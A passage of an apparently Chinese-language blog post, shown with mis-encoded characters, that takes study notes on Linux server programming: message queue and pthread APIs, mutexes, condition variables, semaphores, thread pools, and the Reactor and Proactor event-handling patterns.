<span class="kt">int</span> <span class="nf">msgget</span><span class="p">(</span><span class="n">key_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">int</span> <span class="n">msgflg</span><span class="p">);</span><span class="c1">//å’Œsemgetç±»ä¼¼ï¼ŒæˆåŠŸè¿”å›æ ‡è¯†ç¬¦</span>

<span class="c1">//2. å‘é€æ¶ˆæ¯</span>
<span class="c1">//æˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1</span>
<span class="kt">int</span> <span class="nf">msgsnd</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msg_ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msg_sz</span><span class="p">,</span> <span class="kt">int</span> <span class="n">msgflg</span><span class="p">);</span>
<span class="cm">/*
  msqid:æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦
  msg_ptr:å°†å‘å¾€æ¶ˆæ¯é˜Ÿåˆ—çš„æ¶ˆæ¯ç»“æ„ä½“æŒ‡é’ˆï¼Œç»“æ„ä¸ºï¼š
  struct msg_st{
    long  msg_type;     //æ¶ˆæ¯ç±»å‹ï¼Œç”¨æˆ·è‡ªå®šä¹‰,æ¥æ”¶æ–¹ä¼šæ ¹æ®ç±»å‹é€‰æ‹©æ¥å—
    char text[BUFSIZ];  //å‘é€çš„æ¶ˆæ¯ï¼Œä¸ä¸€å®šæ˜¯char
};
  msg_sz:æ¶ˆæ¯ç»“æ„ä½“ä¸­å¾…ä¼ è¾“æ•°æ®çš„å¤§å°
  msgflag:IPC_NOTWAIT(æ¶ˆæ¯é˜Ÿåˆ—æ»¡æ—¶è¿”å›-1)ã€0(æ¶ˆæ¯é˜Ÿåˆ—æ»¡æ—¶å µå¡)
  
*/</span>
<span class="c1">//3. æ¥å—æ¶ˆæ¯</span>
<span class="kt">int</span> <span class="nf">msgrcv</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">msg_ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">msg_sz</span><span class="p">,</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">msgtype</span><span class="p">,</span> <span class="kt">int</span> <span class="n">msgflg</span><span class="p">);</span>
<span class="cm">/*
  é™¤äº†msgtypeï¼Œå…¶ä»–å››ä¸ªå‚æ•°åŒmsgsnd
  msgtypeï¼š
    msgtype = 0 è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ç¬¬ä¸€ä¸ªæ¶ˆæ¯
    msgtype &gt; 0 è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ç¬¬ä¸€ä¸ªç±»å‹æ˜¯msgtypeçš„æ¶ˆæ¯ é™¤éæ ‡å¿—äº†MSG_EXCEPT
    msgtype &lt; 0 è¯»å–ç¬¬ä¸€ä¸ª ç±»å‹å€¼ &lt; abs(msgtype)çš„æ¶ˆæ¯
*/</span>

<span class="c1">//4. æ§åˆ¶æ¶ˆæ¯é˜Ÿåˆ—</span>
<span class="kt">int</span> <span class="nf">msgctl</span><span class="p">(</span><span class="kt">int</span> <span class="n">msqid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">command</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">msqid_ds</span> <span class="o">*</span><span class="n">buf</span><span class="p">);</span>
<span class="cm">/*
  msqid:æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦
  command:
    PC_STAT å¤åˆ¶æ¶ˆæ¯é˜Ÿåˆ—å…³è”çš„æ•°æ®ç»“æ„å­˜å‚¨åœ¨bufä¸­
    IPC_SET å°†bufä¸­çš„éƒ¨åˆ†æˆå‘˜æ›´æ–°åˆ°ç›®æ ‡çš„å†…æ ¸æ•°æ®
    IPC_RMID ç«‹å³ç§»é™¤æ¶ˆæ¯é˜Ÿåˆ—, å”¤é†’æ‰€æœ‰ç­‰å¾…è¯»æ¶ˆæ¯å’Œå†™æ¶ˆæ¯çš„è¿›ç¨‹
  msqid_ds:å¦‚ä¸‹å›¾
*/</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002620.png" alt="image-20220501165712574" /></p>

<h4 id="å…±äº«å†…å­˜-shared-memory">å…±äº«å†…å­˜ shared memory</h4>

<p>ğŸ¦ğŸ¦ğŸ¦</p>

<h2 id="å¤šçº¿ç¨‹ç¼–ç¨‹">å¤šçº¿ç¨‹ç¼–ç¨‹</h2>

<h3 id="çº¿ç¨‹api">çº¿ç¨‹API</h3>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//1. åˆ›å»ºçº¿ç¨‹</span>
<span class="err">æˆåŠŸè¿”å›</span><span class="mi">0</span><span class="err">ï¼Œå¤±è´¥è¿”å›é”™è¯¯ç </span>
<span class="kt">int</span> <span class="nf">pthread_create</span><span class="p">(</span><span class="n">pthread_t</span><span class="o">*</span> <span class="kr">thread</span><span class="p">,</span> <span class="k">const</span> <span class="n">pthread_attr_t</span><span class="o">*</span> <span class="n">attr</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">start_routine</span><span class="p">)(</span><span class="kt">void</span><span class="o">*</span><span class="p">),</span> <span class="kt">void</span><span class="o">*</span> <span class="n">arg</span><span class="p">);</span>

<span class="c1">//2. é€€å‡ºçº¿ç¨‹</span>
<span class="kt">void</span> <span class="nf">pthread_exit</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">retval</span><span class="p">);</span>

<span class="c1">//3. å›æ”¶(ç­‰å¾…)çº¿ç¨‹ï¼Œç±»ä¼¼è¿›ç¨‹ä¸­çš„waitpid</span>
<span class="c1">//æˆåŠŸæ—¶è¿”å›0, å¤±è´¥è¿”å›é”™è¯¯ç </span>
<span class="kt">int</span> <span class="nf">pthread_join</span><span class="p">(</span><span class="n">pthread_t</span> <span class="kr">thread</span><span class="p">,</span> <span class="kt">void</span><span class="o">**</span> <span class="n">retval</span><span class="p">);</span>

<span class="c1">//4. ç»ˆæ­¢çº¿ç¨‹</span>
<span class="c1">//æˆåŠŸæ—¶è¿”å›0, å¤±è´¥è¿”å›é”™è¯¯ç </span>
<span class="kt">int</span> <span class="n">pthread_cancel</span><span class="p">(</span><span class="n">pthread_t</span> <span class="kr">thread</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="å¤šçº¿ç¨‹åŒæ­¥">å¤šçº¿ç¨‹åŒæ­¥</h3>

<h4 id="äº’æ–¥é‡">äº’æ–¥é‡</h4>

<p>äº’æ–¥é‡ä¸»è¦ç”¨äºåŒæ­¥çº¿ç¨‹å¯¹å…±äº«æ•°æ®çš„è®¿é—®ã€‚</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// åˆå§‹åŒ–äº’æ–¥é”</span>
<span class="c1">// ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å‘ç›®æ ‡äº’æ–¥é”, ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šå±æ€§ nullptråˆ™ä¸ºé»˜è®¤</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_init</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">,</span> <span class="k">const</span> <span class="n">pthread_mutexattr_t</span> <span class="o">*</span><span class="n">mutexattr</span><span class="p">);</span>

<span class="c1">// é”€æ¯ç›®æ ‡äº’æ–¥é”</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_destory</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>

<span class="c1">// é’ˆå¯¹æ™®é€šé”åŠ é”</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>

<span class="c1">// é’ˆå¯¹æ™®é€šé”ç«‹å³è¿”å› ç›®æ ‡æœªåŠ é”åˆ™åŠ é” å¦‚æœå·²ç»åŠ é”åˆ™è¿”å›é”™è¯¯ç EBUSY</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_trylock</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>

<span class="c1">// è§£é” å¦‚æœæœ‰å…¶ä»–çº¿ç¨‹åœ¨ç­‰å¾…è¿™ä¸ªäº’æ–¥é”, åˆ™å…¶ä¸­ä¹‹ä¸€è·å¾—</span>
<span class="kt">int</span> <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="æ¡ä»¶å˜é‡">æ¡ä»¶å˜é‡</h4>

<p>æ¡ä»¶å˜é‡ä¸»è¦ç”¨äºçº¿ç¨‹ä¹‹é—´åŒæ­¥å…±äº«æ•°æ®çš„å€¼ï¼Œæ¡ä»¶å˜é‡æä¾›äº†ä¸€ç§çº¿ç¨‹é—´çš„é€šçŸ¥æœºåˆ¶ï¼Œå½“æŸä¸ªå…±äº«æ•°æ®è¾¾åˆ°æŸä¸ªå€¼æ—¶ï¼Œå”¤é†’ç­‰å¾…è¿™ä¸ªå…±äº«æ•°æ®çš„çº¿ç¨‹ã€‚</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//åˆå§‹åŒ–æ¡ä»¶å˜é‡</span>
<span class="kt">int</span> <span class="nf">pthread_cond_init</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">,</span> <span class="k">const</span> <span class="n">pthread_condattr</span> <span class="o">*</span><span class="n">cond_attr</span><span class="p">);</span>
<span class="c1">//ä¸‹è¿°ç›¸å½“äºåˆå§‹åŒ–ä¸€ä¸ªå­—æ®µå…¨ä¸ºç©ºçš„æ¡ä»¶å˜é‡</span>
<span class="n">pthread_cond_t</span> <span class="n">cond</span> <span class="o">=</span> <span class="n">PTHREAD_COND_INITIALIZER</span><span class="p">;</span>

<span class="c1">// é”€æ¯ä¸€ä¸ªæ­£åœ¨è¢«ç­‰å¾…çš„æ¡ä»¶å˜é‡ å°†ä¼šå¤±è´¥å¹¶è¿”å›EBUSY</span>
<span class="kt">int</span> <span class="nf">pthread_cont_destory</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">);</span>

<span class="c1">// å¹¿æ’­å¼çš„å”¤é†’æ‰€æœ‰ç­‰å¾…ç›®æ ‡æ¡ä»¶å˜é‡çš„çº¿ç¨‹</span>
<span class="kt">int</span> <span class="nf">pthread_cont_broadcast</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">);</span>

<span class="c1">// å”¤é†’ä¸€ä¸ªç­‰å¾…ç›®æ ‡æ¡ä»¶å˜é‡çš„çº¿ç¨‹</span>
<span class="kt">int</span> <span class="nf">pthread_cond_signal</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">);</span>

<span class="c1">// ç­‰å¾…ç›®æ ‡æ¡ä»¶å˜é‡</span>
<span class="kt">int</span> <span class="nf">pthread_cond_wait</span><span class="p">(</span><span class="n">pthread_cond_t</span> <span class="o">*</span><span class="n">cond</span><span class="p">,</span> <span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="n">mutex</span><span class="p">);</span>
</code></pre></div></div>

<h4 id="posix-ä¿¡å·é‡">POSIX ä¿¡å·é‡</h4>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;semaphore&gt;</span><span class="cp">
</span><span class="c1">//åˆ›å»ºä¿¡å·é‡</span>
<span class="kt">int</span> <span class="n">sem_init</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pshared</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span>
<span class="cm">/*
  sem:åˆå§‹åŒ–çš„ä¿¡å·é‡
  psharedä¸º0è¡¨ç¤ºæ˜¯å½“å‰è¿›ç¨‹çš„å±€éƒ¨ä¿¡å·é‡, å¦åˆ™ä¿¡å·é‡å¯ä»¥åœ¨å¤šä¸ªè¿›ç¨‹é—´å…±äº«
  value:ä¿¡å·é‡çš„åˆå§‹å€¼ï¼Œè®¾ç½®ä¸º1å¯ä»¥å½“é”ä½¿ç”¨
*/</span>
<span class="c1">// é”€æ¯ä¿¡å·é‡, é‡Šæ”¾å…¶å ç”¨çš„ç³»ç»Ÿèµ„æº</span>
<span class="kt">int</span> <span class="n">sem_destory</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>

<span class="c1">// ä»¥åŸå­æ“ä½œçš„å½¢å¼å°†ä¿¡å·é‡çš„å€¼ -1, å¦‚æœä¿¡å·é‡çš„å€¼ä¸º0, åˆ™sem_waitå°†è¢«é˜»å¡ç›´åˆ°sem_waitå…·æœ‰é0å€¼ pæ“ä½œ</span>
<span class="kt">int</span> <span class="n">sem_wait</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>

<span class="c1">// è·Ÿä¸Šé¢çš„å‡½æ•°ç›¸åŒä¸è¿‡ä¸ä¼šé˜»å¡. ä¿¡å·é‡ä¸ä¸º0åˆ™å‡ä¸€æ“ä½œ, ä¸º0åˆ™è¿”å›-1 errno</span>
<span class="kt">int</span> <span class="n">sem_trywait</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>

<span class="c1">// åŸå­æ“ä½œå°†ä¿¡å·é‡çš„å€¼ +1 væ“ä½œ</span>
<span class="kt">int</span> <span class="n">sem_post</span><span class="p">(</span><span class="n">sem_t</span><span class="o">*</span> <span class="n">sem</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="è¿›ç¨‹æ± å’Œçº¿ç¨‹æ± ">è¿›ç¨‹æ± å’Œçº¿ç¨‹æ± </h2>

<p>è¿›ç¨‹æ± å’Œçº¿ç¨‹æ± ç±»ä¼¼ï¼ŒåŸºæœ¬ä¸Šå®Œå…¨é€‚ç”¨ã€‚</p>

<p>çº¿ç¨‹æ± å°±æ˜¯æœåŠ¡å™¨é¢„å…ˆåˆ›å»ºçš„ä¸€ç»„å­çº¿ç¨‹ï¼Œçº¿ç¨‹æ± ä¸­çš„æ‰€æœ‰å­çº¿ç¨‹éƒ½è¿è¡Œç€ç›¸åŒçš„ä»£ç ã€‚å½“æœ‰æ–°çš„ä»»åŠ¡åˆ°æ¥æ—¶ï¼Œä¸»çº¿ç¨‹å°†é€šè¿‡æŸç§æ–¹å¼é€‰æ‹©çº¿ç¨‹æ± ä¸­çš„æŸä¸€ä¸ªå­çº¿ç¨‹æ¥ä¸ºä¹‹æœåŠ¡ã€‚ç›¸æ¯”ä¸åŠ¨æ€çš„åˆ›å»ºå­çº¿ç¨‹ï¼Œé€‰æ‹©ä¸€ä¸ªå·²ç»å­˜åœ¨çš„å­çº¿ç¨‹çš„ä»£ä»·æ˜¾ç„¶è¦å°å¾—å¤šã€‚</p>

<ol>
  <li>
    <p>ä¸»çº¿ç¨‹ä½¿ç”¨æŸç§ç®—æ³•æ¥ä¸»åŠ¨é€‰æ‹©å­çº¿ç¨‹ã€‚æœ€ç®€å•ã€æœ€å¸¸ç”¨çš„ç®—æ³•æ˜¯éšæœºç®—æ³•å’Œ Round Robin(è½®æµ é€‰å–)ç®—æ³•ï¼Œä½†æ›´ä¼˜ç§€ã€æ›´æ™ºèƒ½çš„ç®—æ³•å°†ä½¿ä»»åŠ¡åœ¨å„ä¸ªå·¥ä½œçº¿ç¨‹ä¸­æ›´å‡åŒ€åœ°åˆ†é…ï¼Œä»è€Œå‡è½»æœåŠ¡å™¨çš„æ•´ä½“å‹åŠ›ã€‚</p>
  </li>
  <li>
    <p>ä¸»çº¿ç¨‹å’Œæ‰€æœ‰å­çº¿ç¨‹é€šè¿‡ä¸€ä¸ªå…±äº«çš„å·¥ä½œé˜Ÿåˆ—æ¥åŒæ­¥ï¼Œå­çº¿ç¨‹éƒ½ç¡çœ åœ¨è¯¥å·¥ä½œé˜Ÿåˆ—ä¸Šã€‚å½“æœ‰æ–°çš„ä»»åŠ¡åˆ°æ¥æ—¶ï¼Œä¸»çº¿ç¨‹å°†ä»»åŠ¡æ·»åŠ åˆ°å·¥ä½œé˜Ÿåˆ—ä¸­ã€‚è¿™å°†å”¤é†’æ­£åœ¨ç­‰å¾…ä»»åŠ¡çš„å­çº¿ç¨‹ï¼Œä¸è¿‡åªæœ‰ä¸€ä¸ªå­çº¿ç¨‹å°†è·å¾—æ–°ä»»åŠ¡çš„â€æ¥ç®¡æƒâ€œï¼Œå®ƒå¯ä»¥ä»å·¥ä½œé˜Ÿåˆ—ä¸­å–å‡ºä»»åŠ¡å¹¶æ‰§è¡Œä¹‹ï¼Œè€Œå…¶ä»–å­çº¿ç¨‹å°†ç»§ç»­ç¡çœ åœ¨å·¥ä½œé˜Ÿåˆ—ä¸Šã€‚</p>
  </li>
</ol>

<p>è¿™æ„Ÿè§‰ä¸Šå…¶å®å’Œgolangçš„channel+ selectæœºåˆ¶å·®ä¸å¤šï¼Œå®é™…ä¸Šæˆ‘åç»­åœ¨è¿™é‡Œçš„å†™æ³•å°±æ˜¯ä»¿ç…§goçš„æ¨¡å¼æ¥å†™çš„ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002626.png" alt="image-20220508001617260" /></p>

<h2 id="é«˜æ€§èƒ½æœåŠ¡å™¨ç¨‹åºæ¡†æ¶">é«˜æ€§èƒ½æœåŠ¡å™¨ç¨‹åºæ¡†æ¶</h2>

<p>ä¹¦ä¸ŠæŠŠè¿™ä¸€ç« å†…å®¹æ”¾åœ¨äº†I/Oå¤ç”¨ä¹‹å‰ï¼Œè¿™æ˜¯æˆ‘æ²¡æƒ³åˆ°çš„ã€‚</p>

<h3 id="æœåŠ¡å™¨åŸºç¡€æ¡†æ¶">æœåŠ¡å™¨åŸºç¡€æ¡†æ¶</h3>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002631.png" alt="image-20220505190335651" /></p>

<table>
  <thead>
    <tr>
      <th>æ¨¡å—</th>
      <th>åŠŸèƒ½</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>I/Oå¤„ç†å•å…ƒ</td>
      <td>å¤„ç†å®¢æˆ·è¿æ¥ï¼Œè¯»å†™ç½‘ç»œæ•°æ®</td>
    </tr>
    <tr>
      <td>è¯·æ±‚é˜Ÿåˆ—</td>
      <td>å„ä¸ªå•å…ƒä¹‹é—´çš„é€šä¿¡æ–¹å¼</td>
    </tr>
    <tr>
      <td>é€»è¾‘å•å…ƒ</td>
      <td>ä¸šåŠ¡è¿›ç¨‹æˆ–çº¿ç¨‹</td>
    </tr>
    <tr>
      <td>ç½‘ç»œå­˜å‚¨å•å…ƒ</td>
      <td>æœ¬åœ°æ•°æ®åº“ã€æ–‡ä»¶æˆ–è€…ç¼“å­˜</td>
    </tr>
  </tbody>
</table>

<p><strong>I/O å¤„ç†å•å…ƒ</strong>æ˜¯æœåŠ¡å™¨ç®¡ç†å®¢æˆ·è¿æ¥çš„æ¨¡å—ã€‚å®ƒé€šå¸¸è¦å®Œæˆä»¥ä¸‹å·¥ä½œï¼šç­‰å¾…å¹¶æ¥å—æ–°çš„å®¢æˆ·è¿æ¥ï¼Œæ¥æ”¶å®¢æˆ·æ•°æ®ï¼Œå°†æœåŠ¡å™¨å“åº”æ•°æ®è¿”å›ç»™å®¢æˆ·ç«¯ã€‚æ•°æ®çš„æ”¶å‘ä¸ä¸€å®šåœ¨ I/O å¤„ç†å•å…ƒä¸­æ‰§è¡Œï¼Œä¹Ÿå¯èƒ½åœ¨é€»è¾‘å•å…ƒä¸­æ‰§è¡Œï¼Œå…·ä½“åœ¨ä½•å¤„æ‰§è¡Œå–å†³äº<strong>äº‹ä»¶å¤„ç†æ¨¡å¼</strong>ã€‚</p>

<p><strong>è¯·æ±‚é˜Ÿåˆ—</strong>æ˜¯å„ä¸ªå•å…ƒä¹‹é—´é€šä¿¡æ–¹å¼çš„æŠ½è±¡ã€‚è¯·æ±‚é˜Ÿåˆ—é€šå¸¸è¢«å®ç°ä¸º<strong>æ± </strong>çš„ä¸€éƒ¨åˆ†ã€‚</p>

<p><strong>é€»è¾‘å•å…ƒ</strong>é€šå¸¸æ˜¯ä¸€ä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹ã€‚å®ƒåˆ†æå¹¶å¤„ç†å®¢æˆ·æ•°æ®ï¼Œç„¶åå°†ç»“æœä¼ é€’ç»™ I/O å¤„ç†å•å…ƒæˆ–è€…ç›´æ¥å‘é€ç»™å®¢æˆ·ï¼ˆå…·ä½“ä½¿ç”¨å“ªç§æ–¹å¼å–å†³äºäº‹ä»¶å¤„ç†æ¨¡å¼ï¼‰ã€‚æœåŠ¡å™¨é€šå¸¸æ‹¥æœ‰å¤šä¸ªé€»è¾‘å•å…ƒï¼Œä»¥å®ç°å¯¹å¤šä¸ªå®¢æˆ·ä»»åŠ¡çš„å¹¶å‘å¤„ç†ã€‚</p>

<p><strong>ç½‘ç»œå­˜å‚¨å•å…ƒ</strong>å¯ä»¥æ˜¯æ•°æ®åº“ã€ç¼“å­˜å’Œæ–‡ä»¶ã€‚</p>

<h3 id="äº‹ä»¶å¤„ç†æ¨¡å¼">äº‹ä»¶å¤„ç†æ¨¡å¼</h3>

<p>æœåŠ¡å™¨ç¨‹åºé€šå¸¸éœ€è¦å¤„ç†ä¸‰ç±»äº‹ä»¶ï¼šI/O äº‹ä»¶ã€ä¿¡å·åŠå®šæ—¶äº‹ä»¶ã€‚æœ‰ä¸¤ç§é«˜æ•ˆçš„äº‹ä»¶å¤„ç†æ¨¡å¼ï¼š<strong>Reactor</strong> å’Œ <strong>Proactor</strong>ã€‚</p>

<h4 id="reactoræ¨¡å¼">Reactoræ¨¡å¼</h4>

<blockquote>
  <p>Reactoræ¨¡å¼è¦æ±‚ä¸»çº¿ç¨‹ï¼ˆI/Oå¤„ç†å•å…ƒï¼‰åªè´Ÿè´£ç›‘å¬æ–‡ä»¶æè¿°ç¬¦ä¸Šæ˜¯å¦æœ‰äº‹ä»¶å‘ç”Ÿï¼Œæœ‰çš„è¯å°±ç«‹å³å°†è¯¥äº‹ä»¶é€šçŸ¥å·¥ä½œ</p>

  <p>çº¿ç¨‹ï¼ˆé€»è¾‘å•å…ƒï¼‰ï¼Œå°† socket å¯è¯»å¯å†™äº‹ä»¶æ”¾å…¥è¯·æ±‚é˜Ÿåˆ—ï¼Œäº¤ç»™å·¥ä½œçº¿ç¨‹å¤„ç†ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¸»çº¿ç¨‹ä¸åš</p>

  <p>ä»»ä½•å…¶ä»–å®è´¨æ€§çš„å·¥ä½œã€‚è¯»å†™æ•°æ®ï¼Œæ¥å—æ–°çš„è¿æ¥ï¼Œä»¥åŠå¤„ç†å®¢æˆ·è¯·æ±‚å‡åœ¨å·¥ä½œçº¿ç¨‹ä¸­å®Œæˆã€‚</p>
</blockquote>

<p>ä½¿ç”¨åŒæ­¥ I/Oï¼ˆä»¥ epoll_wait ä¸ºä¾‹ï¼‰å®ç°çš„ Reactor æ¨¡å¼çš„å·¥ä½œæµç¨‹æ˜¯ï¼š</p>
<ol>
  <li>ä¸»çº¿ç¨‹å¾€ epoll å†…æ ¸äº‹ä»¶è¡¨ä¸­æ³¨å†Œ socket ä¸Šçš„è¯»å°±ç»ªäº‹ä»¶ã€‚</li>
  <li>ä¸»çº¿ç¨‹è°ƒç”¨ <code class="language-plaintext highlighter-rouge">epoll_wait</code> ç­‰å¾… socket ä¸Šæœ‰æ•°æ®å¯è¯»ã€‚</li>
  <li>å½“ socket ä¸Šæœ‰æ•°æ®å¯è¯»æ—¶ï¼Œ <code class="language-plaintext highlighter-rouge">epoll_wait</code> é€šçŸ¥ä¸»çº¿ç¨‹ã€‚ä¸»çº¿ç¨‹åˆ™å°† socket å¯è¯»äº‹ä»¶æ”¾å…¥è¯·æ±‚é˜Ÿåˆ—ã€‚</li>
  <li>ç¡çœ åœ¨è¯·æ±‚é˜Ÿåˆ—ä¸Šçš„æŸä¸ªå·¥ä½œçº¿ç¨‹è¢«å”¤é†’ï¼Œå®ƒä» socket è¯»å–æ•°æ®ï¼Œå¹¶å¤„ç†å®¢æˆ·è¯·æ±‚ï¼Œç„¶åå¾€ epoll
å†…æ ¸äº‹ä»¶è¡¨ä¸­æ³¨å†Œè¯¥ socket ä¸Šçš„å†™å°±ç»ªäº‹ä»¶ã€‚</li>
  <li>å½“ä¸»çº¿ç¨‹è°ƒç”¨ <code class="language-plaintext highlighter-rouge">epoll_wait</code> ç­‰å¾… socket å¯å†™ã€‚</li>
  <li>å½“ socket å¯å†™æ—¶ï¼Œ<code class="language-plaintext highlighter-rouge">epoll_wait</code> é€šçŸ¥ä¸»çº¿ç¨‹ã€‚ä¸»çº¿ç¨‹å°† socket å¯å†™äº‹ä»¶æ”¾å…¥è¯·æ±‚é˜Ÿåˆ—ã€‚</li>
  <li>ç¡çœ åœ¨è¯·æ±‚é˜Ÿåˆ—ä¸Šçš„æŸä¸ªå·¥ä½œçº¿ç¨‹è¢«å”¤é†’ï¼Œå®ƒå¾€ socket ä¸Šå†™å…¥æœåŠ¡å™¨å¤„ç†å®¢æˆ·è¯·æ±‚çš„ç»“æœã€‚</li>
</ol>

<p>Reactor æ¨¡å¼çš„å·¥ä½œæµç¨‹å›¾ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002636.png" alt="image-20220505191735615" /></p>

<h4 id="proactoræ¨¡å¼">Proactoræ¨¡å¼</h4>

<blockquote>
  <p>Proactor æ¨¡å¼å°†æ‰€æœ‰ I/O æ“ä½œéƒ½äº¤ç»™ä¸»çº¿ç¨‹å’Œå†…æ ¸æ¥å¤„ç†ï¼ˆè¿›è¡Œè¯»ã€å†™ï¼‰ï¼Œå·¥ä½œçº¿ç¨‹ä»…ä»…è´Ÿè´£ä¸šåŠ¡é€»</p>

  <p>è¾‘ã€‚ä½¿ç”¨å¼‚æ­¥ I/O æ¨¡å‹ï¼ˆä»¥ aio_read å’Œ aio_write ä¸ºä¾‹ï¼‰å®ç°çš„ Proactor æ¨¡å¼çš„å·¥ä½œæµç¨‹æ˜¯ï¼š</p>
</blockquote>

<ol>
  <li>ä¸»çº¿ç¨‹è°ƒç”¨ aio_read å‡½æ•°å‘å†…æ ¸æ³¨å†Œ socket ä¸Šçš„è¯»å®Œæˆäº‹ä»¶ï¼Œå¹¶å‘Šè¯‰å†…æ ¸ç”¨æˆ·è¯»ç¼“å†²åŒºçš„ä½ç½®ï¼Œ
ä»¥åŠè¯»æ“ä½œå®Œæˆæ—¶å¦‚ä½•é€šçŸ¥åº”ç”¨ç¨‹åºï¼ˆè¿™é‡Œä»¥ä¿¡å·ä¸ºä¾‹ï¼‰ã€‚</li>
  <li>ä¸»çº¿ç¨‹ç»§ç»­å¤„ç†å…¶ä»–é€»è¾‘ã€‚</li>
  <li>å½“ socket ä¸Šçš„æ•°æ®è¢«è¯»å…¥ç”¨æˆ·ç¼“å†²åŒºåï¼Œå†…æ ¸å°†å‘åº”ç”¨ç¨‹åºå‘é€ä¸€ä¸ªä¿¡å·ï¼Œä»¥é€šçŸ¥åº”ç”¨ç¨‹åºæ•°æ®
å·²ç»å¯ç”¨ã€‚</li>
  <li>åº”ç”¨ç¨‹åºé¢„å…ˆå®šä¹‰å¥½çš„ä¿¡å·å¤„ç†å‡½æ•°é€‰æ‹©ä¸€ä¸ªå·¥ä½œçº¿ç¨‹æ¥å¤„ç†å®¢æˆ·è¯·æ±‚ã€‚å·¥ä½œçº¿ç¨‹å¤„ç†å®Œå®¢æˆ·è¯·æ±‚
åï¼Œè°ƒç”¨ aio_write å‡½æ•°å‘å†…æ ¸æ³¨å†Œ socket ä¸Šçš„å†™å®Œæˆäº‹ä»¶ï¼Œå¹¶å‘Šè¯‰å†…æ ¸ç”¨æˆ·å†™ç¼“å†²åŒºçš„ä½ç½®ï¼Œä»¥
åŠå†™æ“ä½œå®Œæˆæ—¶å¦‚ä½•é€šçŸ¥åº”ç”¨ç¨‹åºã€‚</li>
  <li>ä¸»çº¿ç¨‹ç»§ç»­å¤„ç†å…¶ä»–é€»è¾‘ã€‚</li>
  <li>å½“ç”¨æˆ·ç¼“å†²åŒºçš„æ•°æ®è¢«å†™å…¥ socket ä¹‹åï¼Œå†…æ ¸å°†å‘åº”ç”¨ç¨‹åºå‘é€ä¸€ä¸ªä¿¡å·ï¼Œä»¥é€šçŸ¥åº”ç”¨ç¨‹åºæ•°æ®
å·²ç»å‘é€å®Œæ¯•ã€‚</li>
  <li>åº”ç”¨ç¨‹åºé¢„å…ˆå®šä¹‰å¥½çš„ä¿¡å·å¤„ç†å‡½æ•°é€‰æ‹©ä¸€ä¸ªå·¥ä½œçº¿ç¨‹æ¥åšå–„åå¤„ç†ï¼Œæ¯”å¦‚å†³å®šæ˜¯å¦å…³é—­ socketã€‚</li>
</ol>

<p>Proactor æ¨¡å¼çš„å·¥ä½œæµç¨‹å›¾ï¼š</p>

